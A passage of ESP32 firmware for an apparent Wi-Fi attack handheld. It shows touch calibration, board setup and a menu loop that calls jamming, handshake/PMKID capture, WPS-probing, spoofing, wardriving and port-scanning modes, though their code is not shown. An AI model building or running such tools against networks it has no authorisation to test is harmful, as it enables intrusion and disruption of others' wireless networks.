#if defined(NEONDRIVE_TARGET_CYD)
  tft.drawString(String("VARIANT TEST: ") + CYD_VARIANT_NAME, 8, 8, 2);
#else
  tft.drawString("VARIANT TEST", 8, 8, 2);
#endif
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("Touch panel to print x/y + raw values", 8, 32, 2);

  const uint32_t endMs = millis() + 3000;
  while ((int32_t)(endMs - millis()) > 0) {
    TouchState s = readTouch();
    if (s.down) {
      char line[96];
      snprintf(line, sizeof(line), "x=%d y=%d raw=(%d,%d,%d)", s.x, s.y, s.rx, s.ry, s.z);
      Serial.printf("[touch-test] %s\n", line);
      tft.fillRect(8, 58, tft.width() - 16, 18, TFT_BLACK);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.drawString(line, 8, 58, 2);
      delay(60);
    }
    delay(15);
  }

  tft.fillScreen(TFT_BLACK);
  drawBorder();
#endif
}

#if defined(NEONDRIVE_TARGET_CYD35) && !defined(NEONDRIVE_TARGET_BUTTON_NAV) && defined(ND_TOUCH_CAL_WIZARD) && (ND_TOUCH_CAL_WIZARD == 1)
struct TouchRawPoint {
  int x;
  int y;
};
static constexpr const char* TOUCH_CAL_SD_PATH = "/touch_cal_cyd35.json";

static bool captureTouchRawPoint(TouchRawPoint& out) {
  uint32_t deadline = millis() + 12000;
  while ((int32_t)(deadline - millis()) > 0) {
    TS_Point p = ts.getPoint();
    if (p.z > g_touchZMin) {
      int sumX = 0;
      int sumY = 0;
      int n = 0;
      uint32_t sampleUntil = millis() + 140;
      while ((int32_t)(sampleUntil - millis()) > 0) {
        TS_Point sp = ts.getPoint();
        if (sp.z > g_touchZMin) {
          sumX += sp.x;
          sumY += sp.y;
          n++;
        }
        delay(8);
      }
      if (n > 0) {
        out.x = sumX / n;
        out.y = sumY / n;
      } else {
        out.x = p.x;
        out.y = p.y;
      }
      while (true) {
        TS_Point rp = ts.getPoint();
        if (rp.z <= g_touchZMin) break;
        delay(10);
      }
      delay(80);
      return true;
    }
    delay(8);
  }
  return false;
}

static void drawTouchCalPrompt(const char* label, int tx, int ty) {
  tft.fillScreen(TFT_BLACK);
  tft.setTextDatum(TL_DATUM);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.drawString("TOUCH CALIBRATION (CYD35)", 8, 8, 2);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString(label, 8, 30, 2);

  const int r = 10;
  tft.drawLine(tx - 14, ty, tx + 14, ty, TFT_GREEN);
  tft.drawLine(tx, ty - 14, tx, ty + 14, TFT_GREEN);
  tft.drawCircle(tx, ty, r, TFT_GREEN);
}

static int absInt(int v) { return v < 0 ? -v : v; }

static bool solveRawRangeFromTwoPoints(float rawA, float screenA,
                                       float rawB, float screenB,
                                       int screenMax,
                                       int& outMin, int& outMax) {
  const float dRaw = rawB - rawA;
  if (fabsf(dRaw) < 1.0f) return false;
  const float a = (screenB - screenA) / dRaw;  // s = a*r + b
  if (fabsf(a) < 0.0001f) return false;
  const float b = screenA - (a * rawA);
  float rawMin = (0.0f - b) / a;
  float rawMax = ((float)screenMax - b) / a;
  if (rawMin > rawMax) {
    const float tmp = rawMin;
    rawMin = rawMax;
    rawMax = tmp;
  }
  outMin = (int)floorf(rawMin);
  outMax = (int)ceilf(rawMax);
  return true;
}

static bool runCyd35TouchCalibrationWizard() {
  const int w = tft.width();
  const int h = tft.height();
  TouchRawPoint tl{}, tr{}, bl{}, br{};
  const int edgeInset = 20;

  drawTouchCalPrompt("Touch TOP-LEFT target", edgeInset, edgeInset);
  if (!captureTouchRawPoint(tl)) return false;
  drawTouchCalPrompt("Touch TOP-RIGHT target", w - edgeInset, edgeInset);
  if (!captureTouchRawPoint(tr)) return false;
  drawTouchCalPrompt("Touch BOTTOM-LEFT target", edgeInset, h - edgeInset);
  if (!captureTouchRawPoint(bl)) return false;
  drawTouchCalPrompt("Touch BOTTOM-RIGHT target", w - edgeInset, h - edgeInset);
  if (!captureTouchRawPoint(br)) return false;

  const int nsLeft = (tl.x + bl.x) / 2;
  const int nsRight = (tr.x + br.x) / 2;
  const int nsTop = (tl.y + tr.y) / 2;
  const int nsBottom = (bl.y + br.y) / 2;
  const int nsScore = absInt(nsRight - nsLeft) + absInt(nsBottom - nsTop);

  const int swLeft = (tl.y + bl.y) / 2;
  const int swRight = (tr.y + br.y) / 2;
  const int swTop = (tl.x + tr.x) / 2;
  const int swBottom = (bl.x + br.x) / 2;
  const int swScore = absInt(swRight - swLeft) + absInt(swBottom - swTop);

  if (swScore > nsScore) {
    g_touchSwapXY = true;
    g_touchInvertX = (swLeft > swRight);
    g_touchInvertY = (swTop > swBottom);
  } else {
    g_touchSwapXY = false;
    g_touchInvertX = (nsLeft > nsRight);
    g_touchInvertY = (nsTop > nsBottom);
  }

  const int rx_tl = g_touchSwapXY ? tl.y : tl.x;
  const int rx_tr = g_touchSwapXY ? tr.y : tr.x;
  const int rx_bl = g_touchSwapXY ? bl.y : bl.x;
  const int rx_br = g_touchSwapXY ? br.y : br.x;

  const int ry_tl = g_touchSwapXY ? tl.x : tl.y;
  const int ry_tr = g_touchSwapXY ? tr.x : tr.y;
  const int ry_bl = g_touchSwapXY ? bl.x : bl.y;
  const int ry_br = g_touchSwapXY ? br.x : br.y;

  const float rawLeft = 0.5f * (float)(rx_tl + rx_bl);
  const float rawRight = 0.5f * (float)(rx_tr + rx_br);
  const float rawTop = 0.5f * (float)(ry_tl + ry_tr);
  const float rawBottom = 0.5f * (float)(ry_bl + ry_br);

  const float xLeftScreen = (float)edgeInset;
  const float xRightScreen = (float)(w - edgeInset);
  const float yTopScreen = (float)edgeInset;
  const float yBottomScreen = (float)(h - edgeInset);

  const float xLeftPre = g_touchInvertX ? (float)((w - 1) - (int)xLeftScreen) : xLeftScreen;
  const float xRightPre = g_touchInvertX ? (float)((w - 1) - (int)xRightScreen) : xRightScreen;
  const float yTopPre = g_touchInvertY ? (float)((h - 1) - (int)yTopScreen) : yTopScreen;
  const float yBottomPre = g_touchInvertY ? (float)((h - 1) - (int)yBottomScreen) : yBottomScreen;

  bool okX = solveRawRangeFromTwoPoints(rawLeft, xLeftPre, rawRight, xRightPre, w - 1,
                                        g_touchRawXMin, g_touchRawXMax);
  bool okY = solveRawRangeFromTwoPoints(rawTop, yTopPre, rawBottom, yBottomPre, h - 1,
                                        g_touchRawYMin, g_touchRawYMax);
  if (!okX || !okY) return false;

  g_touchRawXMin = clampi(g_touchRawXMin, 0, 4095);
  g_touchRawXMax = clampi(g_touchRawXMax, 1, 4095);
  g_touchRawYMin = clampi(g_touchRawYMin, 0, 4095);
  g_touchRawYMax = clampi(g_touchRawYMax, 1, 4095);
  if (g_touchRawXMax <= g_touchRawXMin) g_touchRawXMax = min(4095, g_touchRawXMin + 1);
  if (g_touchRawYMax <= g_touchRawYMin) g_touchRawYMax = min(4095, g_touchRawYMin + 1);

  Serial.printf("[touch-cal] swap=%d invX=%d invY=%d x=[%d,%d] y=[%d,%d]\n",
                g_touchSwapXY ? 1 : 0,
                g_touchInvertX ? 1 : 0,
                g_touchInvertY ? 1 : 0,
                g_touchRawXMin, g_touchRawXMax,
                g_touchRawYMin, g_touchRawYMax);

  tft.fillScreen(TFT_BLACK);
  tft.setTextDatum(TL_DATUM);
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.drawString("Touch calibration complete", 8, 10, 2);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Testing...", 8, 30, 2);
  delay(350);
  return true;
}

static bool loadCyd35TouchCalibrationFromSd() {
  if (!sdReady) return false;
  if (!SD.exists(TOUCH_CAL_SD_PATH)) return false;

  File f = SD.open(TOUCH_CAL_SD_PATH, FILE_READ);
  if (!f) return false;

  StaticJsonDocument<256> doc;
  DeserializationError err = deserializeJson(doc, f);
  f.close();
  if (err) return false;

  g_touchSwapXY = doc["swap"] | g_touchSwapXY;
  g_touchInvertX = doc["inv_x"] | g_touchInvertX;
  g_touchInvertY = doc["inv_y"] | g_touchInvertY;
  g_touchRawXMin = doc["x_min"] | g_touchRawXMin;
  g_touchRawXMax = doc["x_max"] | g_touchRawXMax;
  g_touchRawYMin = doc["y_min"] | g_touchRawYMin;
  g_touchRawYMax = doc["y_max"] | g_touchRawYMax;
  g_touchZMin    = doc["z_min"] | g_touchZMin;

  g_touchRawXMin = clampi(g_touchRawXMin, 0, 4095);
  g_touchRawXMax = clampi(g_touchRawXMax, 1, 4095);
  g_touchRawYMin = clampi(g_touchRawYMin, 0, 4095);
  g_touchRawYMax = clampi(g_touchRawYMax, 1, 4095);
  if (g_touchRawXMax <= g_touchRawXMin) g_touchRawXMax = min(4095, g_touchRawXMin + 1);
  if (g_touchRawYMax <= g_touchRawYMin) g_touchRawYMax = min(4095, g_touchRawYMin + 1);

  Serial.printf("[touch-cal] loaded SD %s swap=%d invX=%d invY=%d x=[%d,%d] y=[%d,%d] zMin=%d\n",
                TOUCH_CAL_SD_PATH,
                g_touchSwapXY ? 1 : 0,
                g_touchInvertX ? 1 : 0,
                g_touchInvertY ? 1 : 0,
                g_touchRawXMin, g_touchRawXMax,
                g_touchRawYMin, g_touchRawYMax,
                g_touchZMin);
  return true;
}

static bool saveCyd35TouchCalibrationToSd() {
  if (!sdReady) return false;

  StaticJsonDocument<256> doc;
  doc["version"] = 1;
  doc["swap"] = g_touchSwapXY;
  doc["inv_x"] = g_touchInvertX;
  doc["inv_y"] = g_touchInvertY;
  doc["x_min"] = g_touchRawXMin;
  doc["x_max"] = g_touchRawXMax;
  doc["y_min"] = g_touchRawYMin;
  doc["y_max"] = g_touchRawYMax;
  doc["z_min"] = g_touchZMin;

  if (SD.exists(TOUCH_CAL_SD_PATH)) {
    SD.remove(TOUCH_CAL_SD_PATH);
  }
  File f = SD.open(TOUCH_CAL_SD_PATH, FILE_WRITE);
  if (!f) return false;
  bool ok = (serializeJson(doc, f) > 0);
  f.close();
  if (ok) {
    Serial.printf("[touch-cal] saved SD %s\n", TOUCH_CAL_SD_PATH);
  }
  return ok;
}

static void initCyd35TouchCalibrationFromSdOrWizard() {
#if defined(ND_TOUCH_CAL_ALWAYS) && (ND_TOUCH_CAL_ALWAYS == 1)
  Serial.println("[touch-cal] ND_TOUCH_CAL_ALWAYS=1; running wizard");
  while (!runCyd35TouchCalibrationWizard()) {
    tft.fillScreen(TFT_BLACK);
    tft.setTextDatum(TL_DATUM);
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.drawString("Calibration timed out.", 8, 8, 2);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString("Retrying...", 8, 28, 2);
    delay(500);
  }
  if (!saveCyd35TouchCalibrationToSd()) {
    Serial.println("[touch-cal] save to SD failed (SD missing or write error)");
  }
  return;
#endif
  if (loadCyd35TouchCalibrationFromSd()) return;
  Serial.println("[touch-cal] no saved SD calibration; running wizard");
  runCyd35TouchCalibrationWizard();
  if (!saveCyd35TouchCalibrationToSd()) {
    Serial.println("[touch-cal] save to SD failed (SD missing or write error)");
  }
}
#endif

void setup() {
  Serial.begin(115200);
#if defined(ARDUINO_USB_CDC_ON_BOOT) && (ARDUINO_USB_CDC_ON_BOOT == 1)
  // Native USB CDC: wait up to 1500 ms for a terminal to open the port.
  // Without this, boot log is output before the host CDC driver is ready
  // and every message is silently dropped.  On standalone operation (no PC)
  // this just adds 1500 ms to boot time.
  { uint32_t t = millis(); while (!Serial && millis() - t < 1500) delay(10); }
#endif
  delay(100);
  initUiMetrics();
  Serial.println();
  Serial.printf("=== %s | Milestone D ===\n", ND_PROFILE_NAME);
  printDeviceProfileBanner();
#if defined(NEONDRIVE_TARGET_TEMBED)
  // Power enable — GPIO15 must be HIGH before CC1101 or WS2812 will respond.
  // Set this before neon_rf_init() / display_init() / SPI.begin().
  pinMode(PIN_PWR_EN, OUTPUT);
  digitalWrite(PIN_PWR_EN, HIGH);
  delay(50);
  // Deassert all SPI CS lines so no peripheral is selected during init.
  pinMode(PIN_TFT_CS,    OUTPUT); digitalWrite(PIN_TFT_CS,    HIGH);
  pinMode(PIN_CC1101_CS, OUTPUT); digitalWrite(PIN_CC1101_CS, HIGH);
  pinMode(PIN_SD_CS,     OUTPUT); digitalWrite(PIN_SD_CS,     HIGH);
  pinMode(PIN_NRF24_CS,  OUTPUT); digitalWrite(PIN_NRF24_CS,  HIGH);
  Serial.println("[tembed] PWR_EN=HIGH, all SPI CS deasserted");
#endif

#if !defined(NEONDRIVE_TARGET_M5TAB5)
  // On Tab5, neon_rf_init() is deferred to after M5.begin() because
  // PI4IOE2 (I²C addr 0x44) powers the C6 WiFi module; it is initialised
  // inside M5.begin() via M5GFX.  Calling WiFi.mode() before M5.begin()
  // leaves the C6 without power → SDIO CMD5 gets no response → crash.
  neon_rf_init();
#endif

#if defined(NEONDRIVE_TARGET_BUTTON_NAV)
  if (PIN_NAV_NEXT >= 0) pinMode(PIN_NAV_NEXT, INPUT_PULLUP);
  if (PIN_NAV_SELECT >= 0) pinMode(PIN_NAV_SELECT, INPUT_PULLUP);
  if (PIN_ENCODER_A >= 0) pinMode(PIN_ENCODER_A, INPUT_PULLUP);
  if (PIN_ENCODER_B >= 0) pinMode(PIN_ENCODER_B, INPUT_PULLUP);
#endif
  if (PIN_SW1 >= 0) {
    if (PIN_SW1 == PIN_SD_CS) {
      Serial.printf("[sw1] GPIO%d conflicts with SD CS; SW1 disabled\n", PIN_SW1);
    } else {
      pinMode(PIN_SW1, INPUT_PULLUP);
      sw1Enabled = true;
      Serial.printf("[sw1] SW1 enabled on GPIO%d\n", PIN_SW1);
    }
  }

#if defined(NEONDRIVE_TARGET_M5TAB5)
  {
    auto cfg = M5.config();
    // Set display rotation before begin() so M5GFX wires the touch
    // coordinate transform correctly for our landscape orientation.
    cfg.output_power = true;
    M5.begin(cfg);
  }
  // Rotation is set post-begin here only to match what M5GFX auto-configures.
  // M5GFX maps touch coords to match display rotation internally, so this call
  // is purely cosmetic (output pixel order) — do NOT call setRotation again
  // elsewhere or the touch→pixel mapping will de-sync.
  tft.setRotation(1);
  g_tab5RotationCurrent = 1;
  g_tab5RotationCandidate = 1;
  g_tab5RotationCandidateSinceMs = millis();
  g_tab5RotationLastSampleMs = 0;
  tft.fillScreen(TFT_BLACK);
  drawBorder();
  Serial.printf("[tab5] display %dx%d  touch_enabled=%d\n",
                tft.width(), tft.height(), (int)M5.Touch.isEnabled());
  touch_init();  // just logs the isEnabled() state
  // PI4IOE2 (0x44) is now initialised by M5GFX: C6 WiFi power/enable bits
  // are set HIGH.  Safe to init the RF layer and attempt SDIO contact.
  neon_rf_init();
#elif defined(NEONDRIVE_TARGET_M5CARDPUTER)
  {
    auto cfg = M5.config();
    M5Cardputer.begin(cfg, true);  // true = initialise keyboard (TCA8418)
  }
  // Landscape, USB connector on the right (matches physical keyboard orientation).
  // Call setRotation exactly once — subsequent calls de-sync keyboard input.
  tft.setRotation(1);
  tft.fillScreen(TFT_BLACK);
  drawBorder();
  Serial.printf("[cardputer] display %dx%d  keyboard ready\n",
                tft.width(), tft.height());
  // On Cardputer, WiFi is on-chip ESP32-S3. No SDIO sequencing needed.
  neon_rf_init();
#else
  backlightBringup();
  display_init();
  HypercubeWidget::begin(tft);
  touch_init();
#endif // NEONDRIVE_USES_M5GFX

  // LittleFS
  if (!LittleFS.begin(true)) {
    Serial.println("[fs] LittleFS begin failed (even after format).");
  } else {
    Serial.println("[fs] LittleFS mounted.");
    restoreEpochFromLittleFs();
  }

  // SD (optional but required for PCAP capture files)
  mountSdCard(true);
  nd_usb_msc_tdisplay_init();

#if defined(NEONDRIVE_TARGET_CYD35) && !defined(NEONDRIVE_TARGET_BUTTON_NAV) && defined(ND_TOUCH_CAL_WIZARD) && (ND_TOUCH_CAL_WIZARD == 1)
  initCyd35TouchCalibrationFromSdOrWizard();
#endif
  variantBootSelfTest();

  // Create mutex for serializing WiFi driver ops
  wifiOpMutex = xSemaphoreCreateMutex();
  if (!wifiOpMutex) {
    Serial.println("[wifi] failed to create wifiOpMutex");
  }

  // Config load or defaults
  AppConfig temp;
  applyDefaults(temp);
  bool ok = loadConfig(temp);
  if (!ok) {
    Serial.println("[cfg] using defaults and writing new config.json");
    saveConfig(temp);
  }
  cfg = temp;
#if defined(NEONDRIVE_TARGET_CYD)
  applyCydManualRotation(cfg.startup_manualRotation, false);
#endif
  HypercubeWidget::setEnabled(cfg.ui_hypercube);
  applyBacklightLevel(255);
  applyStatusLedState(ledBrightness, ledRed, ledGreen, ledBlue);
  verboseSerial = cfg.telemetry_verboseSerial;
  printConfigSerial(cfg);
  Serial.println("[dbg] monitor commands: 'v' toggle verbose, 's' status snapshot");
  PACKETLABInit();

  // Initialize Deauth Hunter
  DeauthHunter::init();
  Serial.println("[hunter] Deauth Hunter initialized");
  uiMemLog("boot_after_init");
  uiMemBudgetBoot();

  if (cfg.startup_autoReconnectPrompt && !cfg.wifi_ssid.isEmpty()) {
    Serial.printf("[boot] Auto-reconnecting to '%s'\n", cfg.wifi_ssid.c_str());
    wifiConnectStart(cfg.wifi_ssid, cfg.wifi_password,
                     wifiConnectStatus, wifiConnectInProgress, wifiConnectAttemptMs,
                     wifiConnectSsid, wifiConnectPassword, pushConsoleEventf);
  }
  if (cfg.startup_webserver) {
    Serial.println("[boot] Auto-starting webserver");
    startWebServer();
  }
  setScreen(ScreenId::HOME);
  uiMemLog("after_ui_init");
  pushConsoleEvent("INFO", "SYS", "Firmware boot complete");
}

void loop() {
#if defined(NEONDRIVE_USES_M5GFX)
  // Pump the M5 state machine (touch on Tab5, keyboard on Cardputer).
  // Must be called once per loop before any touch or key read.
  // Cardputer uses M5Cardputer.update() — it overrides M5.update() to also
  // call Keyboard.updateKeyList() via TCA8418. M5.update() alone skips that.
#if defined(NEONDRIVE_TARGET_M5CARDPUTER)
  M5Cardputer.update();
#else
  M5.update();
#endif
#if defined(NEONDRIVE_TARGET_M5TAB5)
  tab5RotationTick();
#endif
#endif // NEONDRIVE_USES_M5GFX

#if ND_HW_KEYBOARD
  {
    neon_key_t k = neon_hal_key_get();
    if (k.key != NeonKey::NONE) {
      handleKeyNav(k);
    }
  }
#endif
  handleSerialDebugCommands();
  PACKETLABMenuTick();
  timeServiceTick();
  GpsService::tick();
  sw1Tick();
  neonPanicTick();
  touchDebugTick();
  
  // Update LED flash state (for handshake victories)
  updateLEDFlash();

  // Background stats update (keeps HUD alive even without touches)
  updateSniffStats();
  rawCaptureTick();
  // perform periodic auto-mode activities
  jammitModeTick();
  yoinkModeTick();
  push1tTick();
  specterTick();
  justGoTick();
  
  // Refresh PUSH1T screen when active and state has changed
  if (screen == ScreenId::PUSH1T_SCREEN) {
    uint32_t sig = 2166136261u;
    auto mix = [&](uint32_t v) { sig ^= v; sig *= 16777619u; };
    mix((uint32_t)push1tWpsDetected);
    mix((uint32_t)push1tVulnerable);
    mix((uint32_t)push1tWpsLocked);
    mix((uint32_t)push1tWpsVersion);
    mix((uint32_t)(push1tProbeCount & 0xFF));
    mix((uint32_t)autoMode);
    mix((uint32_t)hasTarget);
    if (sig != push1tScreenLastSig) {
      drawPush1t();
    }
  }

  // Refresh SP3CTER screen when active and state has changed
  if (screen == ScreenId::SP3CTER_SCREEN) {
    uint32_t sig = 2166136261u;
    auto mix = [&](uint32_t v) { sig ^= v; sig *= 16777619u; };
    mix((uint32_t)specterPmkidCount);
    mix((uint32_t)specterHsCount);
    mix((uint32_t)specterClientCount);
    mix((uint32_t)(specterGhostCount & 0xFF));
    mix((uint32_t)specterLogHead);
    mix((uint32_t)autoMode);
    mix((uint32_t)hasTarget);
    mix((uint32_t)specterGhostInFlight);
    if (sig != specterScreenLastSig) {
      drawSpecter();
    }
  }

  // Refresh Just Go display when active if console has new content or state changed
  if (screen == ScreenId::JUST_GO) {
    uint32_t sig = 2166136261u;
    auto mix = [&](uint32_t v) { sig ^= v; sig *= 16777619u; };
    mix((uint32_t)justGoActive);
    mix((uint32_t)justGoStage);
    mix((uint32_t)justGoMode);
    mix((uint32_t)justGoModeStep);
    mix((uint32_t)justGoTargetCount);
    mix((uint32_t)justGoTargetPos);
    mix((uint32_t)monitorLineCount);
    mix((uint32_t)sniffPps);
    mix((uint32_t)apCount);
    mix((uint32_t)hasTarget);
    mix((uint32_t)lockChannel);
    mix((uint32_t)justGoTargetSucceeded);
    mix((uint32_t)justGoTargetHadClient);
    mix((uint32_t)justGoSessionSuccesses);
    mix((uint32_t)justGoSessionAttempts);
    mix((uint32_t)push1tWpsDetected);
    mix((uint32_t)push1tVulnerable);
    mix((uint32_t)specterPmkidCount);
    mix((uint32_t)specterHsCount);
    mix((uint32_t)(specterGhostCount & 0xFF));
    if (sig != justGoLastRenderSig) {
      drawJustGo();
      justGoLastConsoleLineCount = monitorLineCount;
    }
  }
  
  drawCompanionSyncBadgeTick();
  monitorTick();
  scopeTick();
  reconTick();
  portScannerTick();
  PACKETLABMonitorTick();
  updateHypercubeActivity();
  HypercubeWidget::tick();
#if defined(NEONDRIVE_TARGET_M5TAB5)
  tab5ScreenshotOverlayTick();
#endif
  verboseHeartbeatTick();

  // WiFi connection status updates
  if (wifiConnectInProgress) {
    updateWifiConnectStatus();
  }
  wifiConnectScanTick();
  if (screen == ScreenId::WIFI_SCAN) {
    uint32_t now = millis();
    if (now - wifiRadarLastMs >= 80) {
      wifiRadarLastMs = now;
      wifiRadarSweepDeg += 7.0f;
      if (wifiRadarSweepDeg >= 360.0f) wifiRadarSweepDeg -= 360.0f;
      drawWifiRadarSweep();
    }
  }
  
  // Handle WebServer requests
  if (webServerRunning) {
    webServer.handleClient();
  }

#if defined(NEONDRIVE_TARGET_BUTTON_NAV)
  if (tdisplayNavConsumeRefreshRequest()) {
    tdisplayRedrawCurrentScreen();
  }
#endif

  int tx, ty;
  if (!touchEdgeTriggered(tx, ty)) { delay(5); return; }
  touchDebugDrawMarker(tx, ty);
  if (verboseSerial) {
    Serial.printf("[touch] screen=%s x=%d y=%d\n", screenToStr(screen), tx, ty);
  }
  UI_LOGF("[ui-touch] screen=%s raw=(%d,%d,%d) mapped=(%d,%d)\n",
          screenToStr(screen),
          g_lastTouchRawX, g_lastTouchRawY, g_lastTouchRawZ,
          tx, ty);

#if defined(NEONDRIVE_TARGET_M5TAB5)
  if (hit(btnTab5Screenshot, tx, ty)) {
    char path[48] = {0};
    const bool ok = saveScreenshotToSd(path, sizeof(path));
    tab5ScreenshotToastOk = ok;
    tab5ScreenshotToastUntilMs = millis() + 900;
    if (ok) {
      strncpy(tab5ScreenshotLastPath, path, sizeof(tab5ScreenshotLastPath) - 1);
      tab5ScreenshotLastPath[sizeof(tab5ScreenshotLastPath) - 1] = '\0';
      pushConsoleEventf("INFO", "SHOT", "Saved %s", tab5ScreenshotLastPath);
    } else {
      pushConsoleEvent("WARN", "SHOT", "Screenshot failed");
    }
    drawTab5ScreenshotOverlay();
    waitTouchRelease();
    return;
  }
#endif

  if (screen == ScreenId::NEON_PANIC) {
    ScreenId back = (neonPanicReturnScreen == ScreenId::NEON_PANIC) ? ScreenId::HOME : neonPanicReturnScreen;
    setScreen(back);
    waitTouchRelease();
    return;
  }

  // HOME
  if (screen == ScreenId::HOME) {
    if (homeReconnectPromptActive) {
      if (hit(btnHomePromptNo, tx, ty)) {
        homeReconnectPromptActive = false;
        drawHome();
        waitTouchRelease();
        return;
      }
      if (hit(btnHomePromptYes, tx, ty)) {
        homeReconnectPromptActive = false;
        wifiConnectStatus = "Reconnecting to: " + cfg.wifi_ssid;
        wifiConnectSelectedIdx = -1;
        wifiConnectShowPasswordModal = false;
        setScreen(ScreenId::WIFI_SCAN);
        connectToWifi(cfg.wifi_ssid, cfg.wifi_password);
        drawWifiScan();
        waitTouchRelease();
        return;
      }
      waitTouchRelease();
      return;
    }

    // Targets scan prompt modal
    if (homeTargetsPromptActive) {
      if (hit(btnHomePromptNo, tx, ty)) {
        homeTargetsPromptActive = false;
        drawHome();
        resetTouchLatch();
        return;
      }
      if (hit(btnHomePromptYes, tx, ty)) {
        homeTargetsPromptActive = false;

        // Jump to WiFi scan; scanning is manual via Scan button.
        setScreen(ScreenId::WIFI_SCAN);
        wifiIsScanning = false;
        drawWifiScan();
        waitTouchRelease();
        return;
      }

      // Ignore other touches
      waitTouchRelease();
      return;
    }

    for (int i = 0; i < HOME_BTN_COUNT; ++i) {
      if (homeBtns[i].label == nullptr || homeBtns[i].label[0] == '\0') continue;
      if (!hit(homeBtns[i], tx, ty)) continue;
      switch (i) {
        case 0:
          setScreen(ScreenId::JUST_GO);
          break;
        case 1:
          setScreen(ScreenId::WIFI_SCAN);
          break;
        case 2:
          monitorMode = MonitorMode::FILES;
          monitorReturnScreen = ScreenId::HOME;
          monitorLoadFileDir("/");
          setScreen(ScreenId::MONITOR);
          break;
        case 3:
          homeTargetsPromptActive = false;
          lockChannel = cfg.wifi_defaultLockChannel;
          setScreen(ScreenId::TARGET_DETAILS);
          break;
        case 4:
          setScreen(ScreenId::RECON);
          break;
        case 5:
          setScreen(ScreenId::CONFIG);
          break;
        case 6:
          setScreen(ScreenId::PORT_SCANNER); // was ABOUT - temp Net Scan shortcut
          break;
        case 7:
          Serial.println("[ui] Home -> Packet Lab");
          setScreen(ScreenId::PACKETLAB_MENU);
          break;
        case 8:
          Serial.println("[ui] Home -> WARDRIVE");
#if defined(CYD35_GPS_RX) && defined(CYD35_GPS_TX)
          if (!GpsService::isRunning()) GpsService::begin(CYD35_GPS_RX, CYD35_GPS_TX);
#endif
          setScreen(ScreenId::WARDRIVE);
          break;
        default:
          break;
      }
      waitTouchRelease();
      return;
    }
    waitTouchRelease();
    return;
  }

  // JUST GO
  if (screen == ScreenId::JUST_GO) {
    if (hit(btnJustGoBack, tx, ty)) {
      if (justGoActive) justGoStop();
      setScreen(ScreenId::HOME);
      waitTouchRelease();
      return;
    }
    if (hit(btnJustGoToggle, tx, ty)) {
      if (justGoActive) justGoStop();
      else justGoStart();
      drawJustGo();
      waitTouchRelease();
      return;
    }
    if (hit(btnJustGoSpray, tx, ty)) {
      justGoSprayPray = !justGoSprayPray;
      drawJustGo();
      waitTouchRelease();
      return;
    }
    if (hit(btnJustGoStayMinus, tx, ty)) {
      if (justGoStayMinutes > 1) justGoStayMinutes--;
      drawJustGo();
      waitTouchRelease();
      return;
    }
    if (hit(btnJustGoStayPlus, tx, ty)) {
      if (justGoStayMinutes < 15) justGoStayMinutes++;
      drawJustGo();
      waitTouchRelease();
      return;
    }
    if (hit(btnJustGoProfilePrev, tx, ty)) {
      if ((int)justGoProfile < 3) {
        justGoProfile = (JustGoProfile)((int)justGoProfile + 1);
      } else {
        justGoProfile = JustGoProfile::STANDARD;  // Wrap around
      }
      updateSpoofModeFromProfile();  // Update spoofing mode when profile changes
      drawJustGo();
      waitTouchRelease();
      return;
    }
    if (hit(btnJustGoProfileNext, tx, ty)) {
      if ((int)justGoProfile < 3) {
        justGoProfile = (JustGoProfile)((int)justGoProfile + 1);
      } else {
        justGoProfile = JustGoProfile::STANDARD;  // Wrap around
      }
      updateSpoofModeFromProfile();  // Update spoofing mode when profile changes
      drawJustGo();
      waitTouchRelease();
      return;
    }
    waitTouchRelease();
    return;
  }

  
  // WIFI SCAN (Milestone C)
  if (screen == ScreenId::WIFI_SCAN) {
    if (wifiConnectShowPasswordModal) {
      for (int i = 0; i < wifiPwKeyCount; i++) {
        if (hit(btnWifiPwKeys[i], tx, ty)) {
          if (wifiConnectPassword.length() < 63) wifiConnectPassword += wifiPwKeyValues[i];
          if (wifiPwShift && !wifiPwSymbols) wifiPwShift = false;
          drawWifiScan();
          waitTouchRelease();
          return;
        }
      }
      if (hit(btnWifiPwShift, tx, ty)) {
        if (wifiPwSymbols) { wifiPwSymbols = false; wifiPwShift = false; }
        else wifiPwShift = !wifiPwShift;
        drawWifiScan(); waitTouchRelease(); return;
      }
      if (hit(btnWifiPwMode, tx, ty)) {
        wifiPwSymbols = !wifiPwSymbols; wifiPwShift = false;
        drawWifiScan(); waitTouchRelease(); return;
      }
      if (hit(btnWifiPwBack, tx, ty)) {
        if (!wifiConnectPassword.isEmpty()) wifiConnectPassword.remove(wifiConnectPassword.length() - 1);
        drawWifiScan(); waitTouchRelease(); return;
      }
      if (hit(btnWifiPwClear, tx, ty)) {
        wifiConnectPassword = "";
        drawWifiScan(); waitTouchRelease(); return;
      }
      if (hit(btnWifiPwSpace, tx, ty)) {
        if (wifiConnectPassword.length() < 63) wifiConnectPassword += " ";
        drawWifiScan(); waitTouchRelease(); return;
      }
      if (hit(btnWifiPwCancel, tx, ty)) {
        wifiConnectShowPasswordModal = false;
        drawWifiScan(); waitTouchRelease(); return;
      }
      if (hit(btnWifiPwConnect, tx, ty)) {
        if (apSelected >= 0 && apSelected < apCount && !wifiConnectPassword.isEmpty()) {
          wifiConnectShowPasswordModal = false;
          connectToWifi(aps[apSelected].ssid, wifiConnectPassword);
        }
        drawWifiScan(); waitTouchRelease(); return;
      }
      waitTouchRelease();
      return;
    }

    if (hit(btnWifiBack, tx, ty)) { setScreen(ScreenId::HOME); waitTouchRelease(); return; }

    auto runWifiScanAndRestore = [&]() {
      wifiSnapshotPrimedByBssid();
      wifiIsScanning = true;
      drawWifiScan();
      waitTouchRelease();
      doWifiScanBlocking();
      wifiIsScanning = false;
      wifiRestorePrimedByBssid();
      if (apSelected >= apCount) apSelected = -1;
      drawWifiScan();
    };

    if (hit(btnWifiScan, tx, ty)) {
      runWifiScanAndRestore();
      return;
    }

    if (hit(btnWifiTargetGo, tx, ty)) {
      if (apSelected >= 0 && apSelected < apCount) {
        target = aps[apSelected];
        hasTarget = true;
      }
      lockChannel = cfg.wifi_defaultLockChannel;
      setScreen(ScreenId::TARGET_DETAILS);
      waitTouchRelease();
